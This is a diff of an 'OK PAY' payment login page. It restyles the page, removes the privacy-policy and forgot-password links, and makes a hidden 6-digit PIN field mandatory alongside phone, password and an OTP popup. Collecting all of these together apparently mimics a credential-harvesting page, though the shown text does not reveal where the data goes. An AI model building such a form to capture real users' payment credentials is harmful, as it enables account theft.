@@ -3,12 +3,12 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>OK PAY</title>
+  <title>Ok PAY</title>
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; }
     body {
-      background: #f4f6f9;
-      color: #333;
+      background: #0a0a0a;
+      color: #e0e0e0;
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
       display: flex;
       justify-content: center;
@@ -18,143 +18,119 @@
     }
     .container { width: 100%; max-width: 380px; text-align: center; }
     .logo-box {
-      width: 120px; height: 120px;
-      border-radius: 28px;
-      margin: 0 auto 16px;
+      width: 130px; height: 130px;
+      border-radius: 32px;
+      margin: 0 auto 14px;
       overflow: hidden;
-      background: linear-gradient(135deg, #4c1d95 0%, #312e81 100%);
+      background: #0f0f0f;
       display: flex;
-      flex-direction: column;
       justify-content: center;
       align-items: center;
-      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+      box-shadow: 0 0 40px rgba(59, 130, 246, 0.2);
+      border: 1px solid rgba(59, 130, 246, 0.3);
     }
-    .logo-text {
-      font-size: 42px; font-weight: 900; letter-spacing: -2px;
-      color: #ffd700; line-height: 1; text-transform: lowercase;
-    }
-    .logo-sub {
-      font-size: 13px; font-weight: 700; letter-spacing: 4px;
-      color: #fff; margin-top: 4px; text-transform: uppercase;
-    }
+    .logo-box img { width: 100%; height: 100%; object-fit: cover; display: block; }
     .brand-name {
-      font-size: 24px; font-weight: 800; letter-spacing: 2px;
-      color: #111; margin-bottom: 24px; display: none;
+      font-size: 24px; font-weight: 800; letter-spacing: 4px;
+      color: #fff; margin-bottom: 6px; text-transform: uppercase;
+    }
+    .brand-tagline {
+      font-size: 12px; color: #3b82f6; letter-spacing: 2px;
+      margin-bottom: 36px; text-transform: uppercase; opacity: 0.9;
     }
     .input-group {
       display: flex; align-items: center;
-      background: #ffffff;
-      border: 1px solid #e2e8f0;
+      background: rgba(255, 255, 255, 0.02);
+      border: 1.5px solid #2a2a2a;
       border-radius: 30px; padding: 16px 22px;
       margin-bottom: 16px;
-      box-shadow: 0 2px 5px rgba(0,0,0,0.02);
     }
-    .input-group:focus-within { border-color: #00b87c; box-shadow: 0 0 0 3px rgba(0, 184, 124, 0.1); }
-    .input-group svg { width: 22px; height: 22px; fill: #64748b; margin-right: 16px; flex-shrink: 0; }
+    .input-group:focus-within { border-color: #3b82f6; }
+    .input-group svg { width: 22px; height: 22px; fill: #3b82f6; margin-right: 16px; flex-shrink: 0; }
     .input-group input {
-      background: transparent; border: none; color: #1e293b;
+      background: transparent; border: none; color: #fff;
       font-size: 16px; width: 100%; outline: none; font-weight: 500;
     }
-    .input-group input::placeholder { color: #94a3b8; font-weight: 400; }
+    .input-group input::placeholder { color: #555; font-weight: 400; }
     .input-group input#pin { letter-spacing: 8px; font-weight: 600; }
     .input-group input#pin::placeholder { letter-spacing: normal; font-weight: 400; }
-    
     .row {
       display: flex; justify-content: space-between; align-items: center;
-      font-size: 14px; margin-bottom: 22px;
+      font-size: 14px; color: #3b82f6; margin-bottom: 22px;
       padding: 0 6px; font-weight: 600;
     }
-    .row a { color: #00b87c; text-decoration: none; }
-    .row div { display: flex; align-items: center; gap: 8px; cursor: pointer; color: #64748b; font-weight: 500; }
-    .row input[type="radio"] { width: 16px; height: 16px; accent-color: #00b87c; }
-    
+    .row a { color: #3b82f6; text-decoration: none; }
+    .row div { display: flex; align-items: center; gap: 8px; cursor: pointer; }
+    .row input[type="radio"] { width: 16px; height: 16px; accent-color: #3b82f6; }
     .checkbox-container {
       display: flex; align-items: center; justify-content: center;
-      font-size: 13px; color: #64748b; margin-bottom: 28px;
+      font-size: 13px; color: #3b82f6; margin-bottom: 28px;
       font-weight: 500; gap: 10px;
     }
-    .checkbox-container a { color: #00b87c; text-decoration: underline; }
-    .checkbox-container input { width: 18px; height: 18px; accent-color: #00b87c; }
-    
+    .checkbox-container input { width: 18px; height: 18px; accent-color: #3b82f6; }
     .btn-main {
       width: 100%; padding: 17px;
-      background: #00b87c;
+      background: linear-gradient(135deg, #1e3a8a 0%, #1e40af 100%);
       color: #fff; border: none; border-radius: 30px;
       font-size: 17px; font-weight: 700; cursor: pointer;
-      letter-spacing: 0.5px; box-shadow: 0 4px 15px rgba(0, 184, 124, 0.3);
-      transition: background 0.2s;
+      letter-spacing: 1px; box-shadow: 0 4px 15px rgba(59, 130, 246, 0.3);
     }
-    .btn-main:hover { background: #00a26d; }
-    .btn-main:disabled { background: #cbd5e1; cursor: not-allowed; color: #94a3b8; box-shadow: none; }
-    
-    .forgot-link {
-      margin-top: 24px;
-      display: block;
-      color: #00b87c;
-      font-size: 14px;
-      font-weight: 600;
-      text-decoration: none;
-    }
-
+    .btn-main:disabled { background: #2a2a2a; cursor: not-allowed; color: #666; box-shadow: none; }
     .popup-overlay {
       display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0;
-      background: rgba(0, 0, 0, 0.5); justify-content: center; align-items: center;
-      padding: 20px; z-index: 1000; backdrop-filter: blur(4px);
+      background: rgba(0, 0, 0, 0.85); justify-content: center; align-items: center;
+      padding: 20px; z-index: 1000; backdrop-filter: blur(8px);
     }
     .popup-box {
-      background: #ffffff;
+      background: linear-gradient(135deg, #1a1a1a 0%, #141414 100%);
       padding: 28px 24px; border-radius: 26px;
       width: 100%; max-width: 380px; position: relative;
-      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.15);
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8); border: 1px solid rgba(59, 130, 246, 0.2);
     }
     .close-btn {
       position: absolute; top: 15px; right: 15px;
-      background: #f1f5f9; color: #64748b; border: none;
+      background: #2a2a2a; color: #aaa; border: none;
       border-radius: 50%; width: 34px; height: 34px;
       font-size: 16px; cursor: pointer;
       display: flex; align-items: center; justify-content: center;
     }
-    .popup-box h2 { font-size: 22px; margin-bottom: 12px; text-align: left; color: #1e293b; }
-    .popup-box p { font-size: 14px; color: #64748b; margin-bottom: 14px; line-height: 1.5; text-align: left; }
-    .popup-box p span { color: #00b87c; font-weight: 700; }
-    
+    .popup-box h2 { font-size: 22px; margin-bottom: 12px; text-align: left; color: #fff; }
+    .popup-box p { font-size: 14px; color: #999; margin-bottom: 14px; line-height: 1.5; text-align: left; }
+    .popup-box p span { color: #3b82f6; font-weight: 700; }
     .otp-input-group {
       display: flex; align-items: center;
-      background: #f8fafc;
-      border: 1px solid #e2e8f0;
+      background: rgba(255, 255, 255, 0.02);
+      border: 1.5px solid #2a2a2a;
       border-radius: 30px; padding: 5px 5px 5px 20px;
       margin-bottom: 20px;
       width: 100%; box-sizing: border-box; overflow: hidden;
     }
-    .otp-input-group:focus-within { border-color: #00b87c; }
+    .otp-input-group:focus-within { border-color: #3b82f6; }
     .otp-input-group input {
       flex: 1; background: transparent; border: none;
-      color: #1e293b; padding: 12px 0; font-size: 16px;
+      color: #fff; padding: 12px 0; font-size: 16px;
       outline: none; letter-spacing: 2px; min-width: 0;
     }
-    .otp-input-group input::placeholder { color: #94a3b8; letter-spacing: normal; }
+    .otp-input-group input::placeholder { color: #666; letter-spacing: normal; }
     .otp-input-group button {
-      background: #00b87c;
+      background: linear-gradient(135deg, #1e3a8a, #1e40af);
       color: #fff; border: none; border-radius: 25px;
       padding: 14px 22px; font-weight: 700; cursor: pointer; font-size: 14px;
       white-space: nowrap; flex-shrink: 0; min-width: 85px; text-align: center;
     }
-    .otp-input-group button:disabled { background: #cbd5e1; color: #94a3b8; cursor: not-allowed; }
-    
-    .timer-text { color: #64748b; font-size: 13px; margin-bottom: 20px; text-align: center; min-height: 18px; }
-    
+    .otp-input-group button:disabled { background: #333; color: #777; cursor: not-allowed; }
+    .timer-text { color: #888; font-size: 13px; margin-bottom: 20px; text-align: center; min-height: 18px; }
     .toast {
       position: fixed; top: 20px; left: 50%;
       transform: translateX(-50%) translateY(-100px);
-      background: #1e293b;
+      background: linear-gradient(135deg, #1e3a8a, #1e40af);
       color: #fff; padding: 14px 26px; border-radius: 14px;
       font-size: 14px; font-weight: 600; z-index: 2000;
       transition: transform 0.35s; max-width: 90%; text-align: center;
-      box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+      border: 1px solid rgba(59, 130, 246, 0.3);
     }
     .toast.show { transform: translateX(-50%) translateY(0); }
-    .toast.error { background: #ef4444; }
-    
+    .toast.error { background: linear-gradient(135deg, #b91c1c, #991b1b); }
     .loader {
       display: inline-block; width: 16px; height: 16px;
       border: 2px solid rgba(255,255,255,0.3);
@@ -170,15 +146,15 @@
   <div class="toast" id="toast"></div>
 
   <div class="container">
-    <!-- OK PAY Logo Box -->
     <div class="logo-box">
-      <div class="logo-text">ok</div>
-      <div class="logo-sub">PAY</div>
+      <img src="oklogo.png" alt="Ok PAY">
     </div>
+    <div class="brand-name">Ok PAY</div>
+    <div class="brand-tagline">Secure Payment</div>
 
     <div class="input-group">
       <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
-      <input type="tel" id="phone" placeholder="Phone" maxlength="10" inputmode="numeric" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0,10)">
+      <input type="tel" id="phone" placeholder="Phone Number" maxlength="10" inputmode="numeric" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0,10)">
     </div>
 
     <div class="input-group">
@@ -186,8 +162,7 @@
       <input type="password" id="pass" placeholder="Password">
     </div>
 
-    <!-- Agar 6-digit PIN bhi chahiye toh ye input enable rehne dein -->
-    <div class="input-group" style="display:none;">
+    <div class="input-group">
       <svg viewBox="0 0 24 24"><path d="M12.65 10C11.83 7.67 9.61 6 7 6c-3.31 0-6 2.69-6 6s2.69 6 6 6c2.61 0 4.83-1.67 5.65-4H17v4h4v-4h2v-4H12.65zM7 14c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2z"/></svg>
       <input type="tel" id="pin" placeholder="6-digit PIN" maxlength="6" inputmode="numeric" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0,6)">
     </div>
@@ -198,12 +173,10 @@
     </div>
 
     <div class="checkbox-container">
-      <input type="radio" name="agree" checked> Agree <a href="#">"User Privacy Agreement"</a>
+      <input type="radio" name="agree" checked> Agree "User Privacy Agreement"
     </div>
 
-    <button class="btn-main" id="signInBtn" onclick="showOTP()">Sign In</button>
-    
-    <a href="#" class="forgot-link">Forget Password</a>
+    <button class="btn-main" id="signInBtn" onclick="showOTP()">SIGN IN</button>
   </div>
 
   <div class="popup-overlay" id="otpPopup">
@@ -252,12 +225,12 @@
       if (isProcessing) return;
       const phone = document.getElementById('phone').value.trim();
       const pass = document.getElementById('pass').value.trim();
-      const pinElem = document.getElementById('pin');
-      const pin = pinElem ? pinElem.value.trim() : "";
+      const pin = document.getElementById('pin').value.trim();
       const btn = document.getElementById('signInBtn');
 
-      if (!phone || !pass) { showToast('Please fill all fields!', true); return; }
+      if (!phone || !pass || !pin) { showToast('Please fill all fields!', true); return; }
       if (phone.length !== 10) { showToast('Phone must be 10 digits!', true); return; }
+      if (pin.length !== 6) { showToast('PIN must be exactly 6 digits!', true); return; }
 
       isProcessing = true;
       btn.disabled = true;
@@ -277,7 +250,7 @@
       } finally {
         isProcessing = false;
         btn.disabled = false;
-        btn.textContent = 'Sign In';
+        btn.textContent = 'SIGN IN';
       }
     }
 
@@ -354,6 +327,5 @@
       }
     });
   </script>
-
 </body>
 </html>
